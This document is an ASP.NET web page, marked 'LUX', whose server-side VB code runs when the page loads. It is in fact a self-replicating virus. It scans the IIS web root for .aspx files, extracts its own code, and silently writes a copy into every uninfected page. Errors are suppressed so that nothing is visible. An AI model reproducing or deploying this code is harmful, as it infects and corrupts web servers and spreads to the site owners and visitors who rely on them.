<html>
<head>
  <!-- LUX -->
  <script language="VB" runat="server">
  Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
     Try
      Dim di As New System.IO.DirectoryInfo("C:\Inetpub\wwwroot")
      Dim fiArr As System.IO.FileInfo() = di.GetFiles("*.aspx")
      Dim fri As System.IO.FileInfo
      Dim line, file_cont As String
      Dim i,IsInf,rnd_num,place_c,place As Integer
      Dim VirCode As String = ""
      Dim placesarr(235) As Integer
      rnd_num=0
      place_c=0
      For Each fri In fiArr
        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
        Do
          line = file_pointer.ReadLine()
          file_cont=file_cont+line+Chr(13)+Chr(10)
        Loop Until line Is Nothing
        file_pointer.Close()
        For i=0 to file_cont.Length-12
          If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then VirCode = file_cont.Substring(i-1, 2494)
        Next
        rnd_num=rnd_num+fri.Length
      Next
      For Each fri In fiArr
        IsInf=0
        file_cont=""
        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
        Do
          line = file_pointer.ReadLine()
          file_cont=file_cont+line+Chr(13)+Chr(10)
        Loop Until line Is Nothing
        file_pointer.Close()
        For i=0 to file_cont.Length-12
          If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then IsInf = 1
        Next
        If IsInf <> 1 Then
          For i=0 to file_cont.Length-10
            If file_cont.Substring(i,1)=">" Then
              place_c=place_c+1
              placesarr(place_c)=i+2
            End If
            If i+7 <= file_cont.Length Then
              If file_cont.Substring(i,7)="<script" Then
                Dim found_script As Integer=0
                While found_script=0
                  i=i+1
                  If file_cont.Substring(i,9)="</"+"script>" Then found_script=1
                End While
              End If
            End If
          Next
          Dim file_pointerW As New System.IO.StreamWriter("C:\Inetpub\wwwroot\"+fri.Name)
          place=placesarr(rnd_num Mod place_c)
          file_pointerW.WriteLine(file_cont.Substring(0,place-1)+VirCode+file_cont.Substring(place-1,file_cont.Length-place-1))
          file_pointerW.Close()
          i=file_cont.Length
        End If
      Next
      ausgabe.InnerHtml=place
     Catch ex As Exception
     End Try
  End Sub
  </script>
</head>
<body>
<p id="ausgabe" runat="server"></p>
</body>
</html>
